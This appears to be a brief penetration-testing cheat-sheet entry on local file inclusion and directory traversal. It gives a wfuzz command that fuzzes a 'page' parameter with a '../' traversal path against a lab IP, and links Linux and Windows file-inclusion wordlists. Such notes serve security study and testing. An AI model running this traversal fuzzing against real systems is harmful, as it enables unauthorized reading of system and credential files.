# LFI & Directory Traversal

LFI can be a pretty trivial attack path. The most important thing to note is different encodings you might come across when attempting this attack path.

## Automation

```bash
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```

For the wordlists:

### Linux

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

### Windows

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

